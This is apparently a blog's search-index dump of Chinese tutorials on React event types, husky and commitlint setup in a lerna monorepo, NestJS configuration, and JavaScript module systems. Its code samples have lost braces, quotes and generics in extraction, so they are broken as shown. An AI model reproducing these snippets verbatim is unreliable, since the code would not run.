extends React.Component , text: string state = text: , onChange = (e: React.FormEventHTMLInputElement): void = this.setState( text: e.currentTarget.value ) render() return ( div input type=text value=this.state.text onChange=this.onChange / /div ) 在React中，所有事件（包括FormEvent、KeyboardEvent、MouseEvent等）都是SyntheticEvent的子类型。他们在@typesreact中定义如下： // DOM事件的基本属性都定义在这里interface BaseSyntheticEventE = object, C = any, T = any nativeEvent: E; currentTarget: C; target: T; bubbles: boolean; cancelable: boolean; defaultPrevented: boolean; eventPhase: number; isTrusted: boolean; preventDefault(): void; isDefaultPrevented(): boolean; stopPropagation(): void; isPropagationStopped(): boolean; persist(): void; timeStamp: number; type: string;interface SyntheticEventT = Element, E = Event extends BaseSyntheticEventE, EventTarget T, EventTarget // 具体的事件类型：interface FormEventT = Element extends SyntheticEventT interface KeyboardEventT = Element extends SyntheticEventT, NativeKeyboardEvent altKey: boolean; // ...interface MouseEventT = Element, E = NativeMouseEvent extends SyntheticEventT, E altKey: boolean; // ...// ...","tags":["React"],"categories":["React"]},{"title":"lerna项目中集成husky、lint-staged、commitlint和cz-customizable","path":"/2021/04/02/b727669177ea/","content":"Monorepo 是针对单仓库、多 package 的流行解决方案, lerna 是它的一种实现。 说明重要package版本说明： “husky”: “^6.0.0” “lint-staged”: “^10.5.4” “@commitlintcli”: “^12.0.1” “@commitlintconfig-conventional”: “^12.0.1” “cz-customizable”: “^6.3.0” 配置husky在lerna项目根目录中安装husky: yarn add husky -D 注意：husky v4和v6版本的配置方式大相径庭，这里只介绍v6版本的配置方式，v4的网上一搜一大把，这里不过多介绍 在package.json的scripts中添加prepare: husky install，并运行这条命令： npm set-script prepare husky install npm run prepare 添加一个hook: npx husky add .husky/pre-commit npm test 上面这个命令会在.husky目录下新建一个pre-commit文件，其内容如下： #!/bin/sh. $(dirname $0)/_/husky.shnpm test 以上都是手动安装husky的过程，当然官方也提供了一键安装和配置脚本，推荐使用： npx husky-init npm install # npmnpx husky-init yarn # Yarn 1yarn dlx husky-init --yarn2 yarn # Yarn 2 如果使用的是v4版本的husky，想升级到v6，可以使用以下命名，一键迁移： // npmnpm install husky@6 --save-dev \\ npx husky-init \\ npm exec -- github:typicode/husky-4-to-6 --remove-v4-config // yarn 1yarn add husky@6 --dev \\ npx husky-init \\ npm exec -- github:typicode/husky-4-to-6 --remove-v4-config// yarn 2yarn add husky@6 --dev \\ yarn dlx husky-init --yarn2 \\ npm exec -- github:typicode/husky-4-to-6 --remove-v4-config 更多配置，详见官方文档：https://typicode.github.io/husky/#/ 配置lint-staged在lerna项目中，由于所有子项目公用一个 repo 源代码仓库，因此它的 husky 钩子只能建立在最顶层目录； 而每次 commit 都很有可能是多个子项目都有改动，这个时候使用 lint-staged 时，就不但要区分文件类型，还要区分改动文件所在的子项目（因为不同的子项目可能会有不同的校验处理）。 这时，我们可以使用 lerna 命令来实现对“哪个子项目有修改”的判断；而 lint-staged 就需要安装在任何一个需要做校验的子项目中。 添加或修改.husky目录下的pre-commit钩子如下： #!/bin/sh. $(dirname $0)/_/husky.shlerna run --concurrency 1 --stream precommit --since HEAD --exclude-dependents 其中，precommit 是在pre-commit钩子中触发的子项目的命令 在子项目中安装和配置lint-staged，并添加precommit命令 安装lint-staged： lerna add lint-staged --scope=xxxx -D 在添加precommit命令： precommit: lint-staged 配置lint-staged： lint-staged: *.ts,tsx,js,jsx: [ eslint ], 更多配置，详见官方文档：https://github.com/okonet/lint-staged#readme 配置commitlint和cz-customizable每个团队对提交的commit message格式有约定俗称的要求，但是没有一个统一的规范，导致大家提交的commit message或多或少不太一样。因此，需要一个工具来帮助大家统一commit message的格式，也方便后续的分析和拓展。 cz-customizable是一个帮助书写commit message的工具，而commitlint是一个校验commit message的工具。 安装commitlint和cz-customizable: yarn add @commitlint/cli @commitlint/config-conventional cz-customizable -D 添加commit-msg钩子 npx husky add .husky/commit-msg yarn commitlint --edit 生成如下文件： #!/bin/sh. $(dirname $0)/_/husky.shyarn commitlint --edit 在package.json中添加以下配置： ... config: commitizen: path: ./node_modules/cz-customizable , cz-customizable: config: ./.cz-config.js , ... 在项目根目录中新建.cz-config.js文件，内容如下： module.exports = types: [ value: feat, name: feat: A new feature , value: fix, name: fix: A bug fix , value: style, name: style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc), , value: refactor, name: refactor: A code change that neither fixes a bug nor adds a feature, , value: revert, name: revert: Revert to a commit , value: chore, name: chore: Changes to the build process or auxiliary tools and libraries such as documentation generation, , value: docs, name: docs: Documentation only changes , value: perf, name: perf: A code change that improves performance, , value: test, name: test: Adding missing tests , ], scopes: [ name: frontend , name: backend , name: service , ], messages: type: Select the type of change that youre committing:, scope: Select the scope of change that youre committing:, // used if allowCustomScopes is true customScope: Denote the custom scope:, subject: Write a SHORT, IMPERATIVE tense description of the change: , body: Provide a LONGER description of the change (optional). Use | to break new line: , breaking: List any BREAKING CHANGES (optional): , footer: List any ISSUES CLOSED by this change (optional). E.g.: #31, #34: , confirmCommit: Are you sure you want to proceed with the commit above?, , allowCustomScopes: true, 在项目根目录中新建.commitlintrc.js文件，内容如下： const typeEnum = require(./.cz-config);module.exports = extends: [@commitlint/config-conventional], rules: type-enum: [2, always, typeEnum.types.map((i) = i.value)], scope-enum: [2, always, typeEnum.scopes.map((i) = i.name)], scope-empty: [2, never], ,; 配置完成后，每次提交commit时，可以使用git cz替换git commit命令，从而辅助我们更加规范的书写commit message。 更多详细配置，可以参考这篇文章：https://juejin.cn/post/6844903831893966856 总结以上就是我对如何在lerna项目中配置husky、lint-staged和Cz工具的一些粗略认知，当然不仅仅是lerna项目，也适用于任何前端项目。 链接 husky官文文档 lint-staged官方文档 Cz工具集使用介绍"},{"title":"NestJS - 配置","path":"/2021/03/17/1255498d9728/","content":"应用程序通常运行在不同的环境，例如，开发有开发环境、测试环境，线上有预发布环境、生产环境，而运行在不同的环境，需要有不同的配置，例如数据库的配置等。 在Node中，外部定义的环境变量通过procress.env全局可见。在Node.js应用程序中，通常使用.env文件来配置这些环境变量，其中每个键代表一个特定的值，以代表每个环境。 解析.env文件并加载到procress.env中，就需要使用dotenv这个包了，但是Nest提供了一个配置环境变量的软件包 - @nestjs/config，其内部依赖了dotenv。 安装@nestjs/config// npm$ npm i --save @nestjs/config// yarn$ yarn add @nestjs/config 简单使用安装完成后，我们可以导入ConfigModule。通常，我们将其导入根目录AppModule并使用. forRoot()静态方法控制其行为。在此步骤中，将解析并生成环境变量键值对。稍后，我们将在其他功能模块中看到一些用于访问的ConfigService类的选项ConfigModule。 import Module from @nestjs/common;import ConfigModule from @nestjs/config;@Module( imports: [ConfigModule.forRoot()],)export class AppModule 上面的代码将从.env默认位置（项目根目录）加载并解析文件，将文件中的键值对.env与分配给其的环境变量合并process.env，并将结果存储在私有结构中，您可以通过访问该私有结构ConfigService。该forRoot()方法注册了ConfigService提供程序，该提供程序提供了get()一种读取这些已解析合并的配置变量的方法。由于@nestjs/config依赖于dotenv，因此它使用该程序包的规则来解决环境变量名称中的冲突。当密钥在运行时环境中作为环境变量（例如，通过OS shell导出之类export DATABASE_USERtest）和在.env文件中同时存在时，运行时环境变量优先。 示例.env文件如下所示： DATABASE_USER=testDATABASE_PASSWORD=test 自定义ENV文件路径默认情况下，程序会在应用程序的根目录中查找.env文件。要为.env文件指定其他路径，请设置forRoot()的可选属性envFilePath，如下所示： ConfigModule.forRoot( envFilePath: .development.env,); 您还可以为.env文件指定多个路径，如下所示： ConfigModule.forRoot( envFilePath: [.env.development.local, .env.development],); 如果在多个文件中找到一个变量，则第一个优先。 在实际开发中，往往有多个配置文件，比如开发环境使用.development.env配置文件，测试环境使用.test.env配置文件，生产环境使用.production.env配置文件，然后使用不同的启动命令，启用不同的配置文件，示例如下： // package.json ... scripts: start: cross-env NODE_ENV=development nest start, start:dev: cross-env NODE_ENV=development nest start --watch, start:prod: cross-env NODE_ENV=production node dist/main, test: cross-env NODE_ENV=test jest, , ... 安装cross-env，使用它跨平台的设置环境变量 ConfigModule.forRoot( envFilePath: `$process.env.NODE_ENV || development.env`,); 使用全局module如果要ConfigModule在其他模块中使用，则需要将其导入（这是所有Nest模块的标准配置）。或者，通过将options对象的isGlobal属性设置为true，将其声明为全局模块，如下所示。在这种情况下，一旦ConfigModule被加载到根模块中，就不需要在其他模块中导入ConfigModule了 ConfigModule.forRoot( isGlobal: true,); 自定义配置文件对于更复杂的项目，可以使用自定义配置文件返回嵌套的配置对象。这允许您按功能对相关配置设置进行分组（例如，与数据库相关的设置），并将相关设置存储在单个文件中，以帮助独立管理它们。 自定义配置文件导出一个工厂函数，该函数返回一个配置对象。配置对象可以是任何任意嵌套的普通JavaScript对象。process.env对象将包含完全解析的环境变量key-value对（如上所述，.env文件和外部定义的变量被解析和合并）。由于你控制了返回的配置对象，你可以添加任何所需的逻辑来将值投射到一个适当的类型，设置默认值等。例如 export default () = ( port: parseInt(process.env.PORT, 10) || 3000, database: host: process.env.DATABASE_HOST, port: parseInt(process.env.DATABASE_PORT, 10) || 5432 ); 将其传给ConfigModule.forRoot()的load属性，来加载这个自定义配置： import configuration from ./config/configuration;@Module( imports: [ ConfigModule.forRoot( load: [configuration], ), ],)export class AppModule load属性是个数组，允许加载多个自定义配置文件 通过自定义配置文件，我们还可以管理自定义文件，如YAML文件。下面是一个使用YAML格式的配置的例子。 http: host: localhost port: 8080db: postgres: url: localhost port: 5432 database: yaml-db sqlite: database: sqlite.db 为了读取和解析YAML文件，我们可以利用js-yaml包。 $ npm i js-yaml$ npm i -D @types/js-yaml 安装软件包后，我们将使用yaml#load函数来加载刚刚在上面创建的YAML文件。 import readFileSync from fs;import * as yaml from js-yaml;import join from path;const YAML_CONFIG_FILENAME = config.yml;export default () = return yaml.load( fs.readFileSync(join(__dirname, YAML_CONFIG_FILENAME), utf8), );; 使用ConfigService要从ConfigService中访问配置值，我们首先得注入ConfigService，和使用其他provider一样，我们需要将其加入@Module的imports属性中（如果将ConfigModule配置成全局module，则可以忽略这一步） @Module( imports: [ConfigModule], // ...) 然后我们可以使用标准的构造函数注入: // import ConfigService from @nestjs/config;constructor(private configService: ConfigService) 获取 // get an environment variableconst dbUser = this.configService.getstring(DATABASE_USER);// get a custom configuration valueconst dbHost = this.configService.getstring(database.host); 如上所示，使用configService.get()方法通过传递变量名来获取一个简单的环境变量。你可以通过传递类型来做TypeScript类型提示，如上所示(例如，getstring(…))。get()方法也可以遍历一个嵌套的自定义配置对象（通过自定义配置文件创建），如上面第二个例子所示。 你也可以使用一个接口作为类型提示来获得整个嵌套的自定义配置对象。 interface DatabaseConfig host: string; port: number;const dbConfig = this.configService.getDatabaseConfig(database);// you can now use `dbConfig.port` and `dbConfig.host`const port = dbConfig.port; get()方法还需要一个可选的第二个参数，定义一个默认值，当键不存在时，将返回默认值，如下所示: // use localhost when database.host is not definedconst dbHost = this.configService.getstring(database.host, localhost); ConfigService有一个可选的泛型(类型参数)来帮助防止访问不存在的配置属性。使用方法如下: interface EnvironmentVariables PORT: number; TIMEOUT: string;// somewhere in the codeconstructor(private configService: ConfigServiceEnvironmentVariables) // this is valid const port = this.configService.getnumber(PORT); // this is invalid as URL is not a property on the EnvironmentVariables interface const url = this.configService.getstring(URL); 配置命名空间ConfigModule允许您定义和加载多个自定义配置文件，如上面的自定义配置文件所示。您可以使用嵌套的配置对象管理复杂的配置对象层次，如该节所示。另外，您也可以使用 registerAs()函数返回一个 “namespaced “的配置对象，如下所示。 import registerAs from @nestjs/config; export default registerAs(database, () = ( host: process.env.DATABASE_HOST, port: process.env.DATABASE_PORT || 5432)); 用forRoot()方法的参数对象的load属性加载一个命名空间的配置，与加载自定义配置文件的方式相同。 import databaseConfig from ./config/database.config;@Module( imports: [ ConfigModule.forRoot( load: [databaseConfig], ), ],)export class AppModule 现在，要从database命名空间中获取host，使用点操作符。使用database作为属性名的前缀，对应于命名空间的名称（作为 registerAs() 函数的第一个参数传递）。 const dbHost = this.configService.getstring(database.host); 一个合理的选择是直接注入database命名空间。这使我们能够从强类型化中获益。 // import ConfigType from @nestjs/config;constructor( @Inject(databaseConfig.KEY) private dbConfig: ConfigTypetypeof databaseConfig,) 缓存环境变量由于访问process.env会很慢，你可以设置传递给ConfigModule.forRoot()的options对象的cache属性，以提高ConfigService的性能。 ConfigModule.forRoot( cache: true,); 部分注册到目前为止，我们已经用forRoot()方法处理了根模块(如AppModule)中的配置文件。也许你有一个更复杂的项目结构，特定功能的配置文件位于多个不同的目录中。@nestjs/config包提供了一个叫做部分注册的功能，它只引用与每个功能模块相关联的配置文件，而不是在根模块中加载所有这些文件。在特性模块中使用forFeature()静态方法来执行这个部分注册，如下所示。 import databaseConfig from ./config/database.config;@Module( imports: [ConfigModule.forFeature(databaseConfig)],)export class DatabaseModule 校验环境变量如果所需的环境变量没有被提供或不符合某些验证规则，在应用程序启动时抛出异常是标准做法。@nestjsconfig包有两种不同的方式来实现这一点。 Joi内置验证器。使用Joi，你可以定义一个对象模式，并对其进行JavaScript对象验证。 一个自定义的validate()函数，它接受环境变量作为输入。 要使用Joi，我们必须安装Joi包: $ yarn add joi 最新版本的joi需要你运行Node v12或更高版本。旧版本的node请安装v16.1.8。这主要是在v17.0.2发布后，在构建的时候会出现错误。更多信息请参考其17.0.0发布说明(https://github.com/sideway/joi/issues/2262)。 现在我们可以定义一个Joi验证模式，并通过forRoot()方法的选项对象的validationSchema属性传递，如下图所示。 import * as Joi from joi;@Module( imports: [ ConfigModule.forRoot( validationSchema: Joi.object( NODE_ENV: Joi.string() .valid(development, production, test, provision) .default(development), PORT: Joi.number().default(3000), ), ), ],)export class AppModule 默认情况下，所有的 schema keys 都被认为是可选的。这里，我们为 NODE_ENV和PORT设置了默认值，如果我们不在环境(.env文件或进程环境)中提供这些变量，就会使用这些变量。另外，我们也可以使用 required() 验证方法来要求必须在环境 (.env 文件或进程环境) 中定义一个值。在这种情况下，如果我们没有在环境中提供变量，验证步骤将抛出一个异常。关于如何构造验证模式，请参见Joi验证方法。 默认情况下，允许未知的环境变量（模式中键不存在的环境变量），并且不会触发验证异常。默认情况下，所有的验证错误都会被报告。你可以通过forRoot()选项对象的validationOptions键传递一个选项对象来改变这些行为。这个选项对象可以包含Joi验证选项提供的任何标准验证选项属性。例如，要反转上面的两个设置，可以传递这样的选项。 import * as Joi from joi;@Module( imports: [ ConfigModule.forRoot( validationSchema: Joi.object( NODE_ENV: Joi.string() .valid(development, production, test, provision) .default(development), PORT: Joi.number().default(3000), ), validationOptions: allowUnknown: false, abortEarly: true, , ), ],)export class AppModule @nestjsconfig包使用的默认设置是: allowUnknown：控制是否允许在环境变量中使用未知键。默认为true。 abortEarly： 如果为true，则在第一个错误时停止验证；如果为false，则返回所有错误。默认值为false。 请注意，一旦你决定传递一个validationOptions对象，你没有明确传递的任何设置都将默认为Joi标准默认值（而不是@nestjsconfig默认值）。例如，如果你在你的自定义validationOptions对象中没有指定allowUnknowns，它将有Joi默认值false。因此，在您的自定义对象中指定这两个设置可能是最安全的。 自定义校验函数另外，你也可以指定一个同步的validate函数，该函数接收一个包含环境变量的对象（来自env文件和进程），并返回一个包含验证过的环境变量的对象，这样你就可以在需要的时候转换它们。如果函数抛出一个错误，它将阻止应用程序的引导。 在这个例子中，我们将继续使用class-transformer和class-validator包。首先，我们必须定义。 一个具有验证约束的类， 一个使用 plainToClass 和 validateSync 函数的验证函数。 import plainToClass from class-transformer;import IsEnum, IsNumber, validateSync from class-validator;enum Environment Development = development, Production = production, Test = test, Provision = provision,class EnvironmentVariables @IsEnum(Environment) NODE_ENV: Environment; @IsNumber() PORT: number;export function validate(config: Recordstring, unknown) const validatedConfig = plainToClass( EnvironmentVariables, config, enableImplicitConversion: true , ); const errors = validateSync(validatedConfig, skipMissingProperties: false ); if (errors.length 0) throw new Error(errors.toString()); return validatedConfig; 完成这些之后，使用validate函数作为ConfigModule的配置选项，如下所示: import validate from ./env.validation;@Module( imports: [ ConfigModule.forRoot( validate, ), ],)export class AppModule 自定义getter函数ConfigService定义了一个通用的get()方法，通过键来检索配置值。我们还可以添加getter函数，以实现更自然的编码风格。 @Injectable()export class ApiConfigService constructor(private configService: ConfigService) get isAuthEnabled(): boolean return this.configService.get(AUTH_ENABLED) === true; 现在我们可以使用getter函数如下: @Injectable()export class AppService constructor(apiConfigService: ApiConfigService) if (apiConfigService.isAuthEnabled) // Authentication is enabled 可扩展变量@nestjsconfig支持环境变量扩展。通过这种技术，你可以创建嵌套的环境变量，其中一个变量被引用到另一个变量的定义中。比如说 APP_URL=mywebsite.comSUPPORT_EMAIL=support@$APP_URL 通过这种结构，变量SUPPORT_EMAIL解析为support@mywebsite.com。请注意使用 $... 语法来触发解析 SUPPORT_EMAIL 定义中的变量 APP_URL 的值。 对于这个功能，@nestjsconfig包内部使用dotenv-expand。 使用传递给ConfigModule的forRoot()方法的选项对象中的expandVariables属性启用环境变量扩展，如下所示。 @Module( imports: [ ConfigModule.forRoot( // ... expandVariables: true, ), ],)export class AppModule 在 main.ts 中使用虽然我们的配置是存储在service中的，但它仍然可以在main.ts文件中使用。这样，你就可以用它来存储变量，如应用程序端口或CORS host。 要访问它，你必须使用app.get()方法，然后是服务引用。 const configService = app.get(ConfigService); 然后，你可以像往常一样，通过调用配置键的get方法来使用它。 const port = configService.get(PORT); 本文基本上是官文文档中有关配置部分的中文翻译（https://docs.nestjs.com/techniques/configuration），有时间再写个实战文章。"},{"title":"Javascript 模块管理","path":"/2020/08/29/d906451e51cd/","content":"CommonJSCommonJS是Node.js对模块开发的标准规范。 CommonJS module基本要求如下： 一个文件就是一个模块，拥有单独的作用域 普通方式定义的 变量、函数、对象都属于该模块内 通过 require 来加载模块 通过 exports 和 module.exports 来暴露模块中的内容 demo1: // module.jsmodule.exports = name: zhang, getName: function() console.log(this.name); , changeName: function(n) this.name = n; ;// index.jsconst module = require(./module/index);console.log(module)\t// name: zhang, getName: ƒ, changeName: ƒ commons demo2: // module1.jsconst getParam = () = console.log(a);;let a = 123;let b = 456;exports.a = a;exports.b = b;exports.getParam = getParam;// index.jsconst module1 = require(./module/index1);consoel.log(module1, commons1)\t// a: 123, b: 456, getParam: ƒ commons1 demo3: // module2.jslet a = 123;const getSome = () = console.log(yyy);;const getA = () = console.log(a);;exports.getSome = getSome;module.exports = getA;// index.jsconst module2 = require(./module/index2);consoel.log(module2, commons2)\t// function getA() ... 总结 ： 通过这样的一个对比的例子就可以比较清晰的对比出 exports 和 module.exports 的区别:1、当 exports 和 module.exports 同时存在的时候，module.exports 会盖过 exports2、当模块内部全部是 exports 的时候， 就等同于 module.exports3、最后 我们就可以认定为 exports 其实就是 module.exports 的子集。 AMDAMD全称为异步模块定义, 是专门为浏览器中JavaScript环境设计的规范。 AMD设计出一个简洁的写模块API： define(id?, dependencies?, factory); 其中： id: 模块标识，可以省略。 dependencies: 所依赖的模块，可以省略。 factory: 模块的实现，或者一个JavaScript对象。如果为函数，它应该只被执行一次，如果是对象，此对象应该为模块的输出值。 使用RequireJS的require函数加载模块: require([dependencies], callback); dependencies: 表示所依赖的模块 callback: 一个回调函数，当前面指定的模块都加载成功后，它将被调用。加载的模块会以参数形式传入该函数，从而在回调函数内部就可以使用这些模块 base.js define(function() return mix: function(source, target) ;); ui.js define([base], function(base) return show: function() // todo with module base ); page.js define([data, ui], function(data, ui) // init here) data.js define( users: [], members: []); 以上同时演示了define的三种用法 定义无依赖的模块（base.js） 定义有依赖的模块（ui.js，page.js） 定义数据对象模块（data.js） CMDAMD开始为摆脱CommonJS的束缚，开创性的提出了自己的模块风格。但后来又做了妥协，兼容了 CommonJS ModulesWrappings 。所以就有了CMD, 它的语法如下: define(id?, dependencies?, factory); 因为CMD推崇一个文件一个模块，所以经常就用文件名作为模块id； CMD推崇依赖就近，所以一般不在define的参数中写依赖，而是在factory中写。 factory有三个参数： function(require, exports, module) require: require 是一个方法，接受 模块标识 作为唯一参数，用来获取其他模块提供的接口； exports: exports 是一个对象，用来向外提供模块接口； module: module 是一个对象，上面存储了与当前模块相关联的一些属性和方法。 demo: define(function(require, exports, module) var base = require(base); exports.show = function() // todo with module base ); AMD推崇依赖前置，在定义模块的时候就要声明其依赖的模块. CMD推崇就近依赖，只有在用到某个模块的时候再去require. AMD和CMD最大的区别是对依赖模块的执行时机处理不同，注意不是加载的时机或者方式不同很多人说requireJS是异步加载模块，SeaJS是同步加载模块，这么理解实际上是不准确的，其实加载模块都是异步的，只不过AMD依赖前置，js可以方便知道依赖模块是谁，立即加载，而CMD就近依赖，需要使用把模块变为字符串解析一遍才知道依赖了那些模块，这也是很多人诟病CMD的一点，牺牲性能来带来开发的便利性，实际上解析模块用的时间短到可以忽略。 ES Module在 ES2015 标准为出来之前，最主要的是CommonJS和AMD规范。上文中我们已经介绍了 CommonJS 规范（主要是为了服务端 NodeJS 服务）和 AMD（主要引用在浏览器端），那么当 ES6标准的出现，为浏览器端模块化做了一个非常好的补充。 export用于对外输出本模块（一个文件可以理解为一个模块）变量的接口import用于导入export导出的模块 // index.jsexport const fn1 = function () console.log(fn1)export const fn2 = function () console.log(fn2)const fn = fn1, fn2export default fn// index1.jsimport fn1, fn2 from index.jsfn1() // fn1fn2() // fn2 import fn from index.jsconsole.log(fn) // fn1: ƒ, fn2: ƒ export 可以导出的是一个对象中包含的多个 属性，方法。 export default 只能导出 一个 可以不具名的 对象。 import fn from ./xxx/xxx ( export 导出方式的 引用方式 ) import fn from ./xxx/xxx1 ( export default 导出方式的 引用方式 ) UMDAMD以浏览器为第一（browser-first）的原则发展，选择异步加载模块。它的模块支持对象（objects）、函数（functions）、构造器（constructors）、字符串（strings）、JSON等各种类型的模块。因此在浏览器中它非常灵活。 CommonJS module以服务器端为第一（server-first）的原则发展，选择同步加载模块。它的模块是无需包装的（unwrapped modules）且贴近于ES.nextHarmony的模块格式。但它仅支持对象类型（objects）模块。 这迫使一些人又想出另一个更通用格式 UMD(Universal Module Definition)。希望提供一个前后端跨平台的解决方案。 UMD的实现很简单，先判断是否支持Node.js模块格式（exports是否存在），存在则使用Node.js模块格式。 再判断是否支持AMD（define是否存在），存在则使用AMD方式加载模块。前两个都不存在，则将模块公开到全局（window或global）。 下面是一个示例 (function (root, factory) if(typeof exports === object typeof module === object) module.exports = factory(); else if(typeof define === function define.amd) define([], factory); else if(typeof exports === object) exports[nav] = factory(); else root[nav] = factory();)(window, this, function() // module return addEvent: function(el, type, handle) //... , removeEvent: function(el, type, handle) , ;)"}]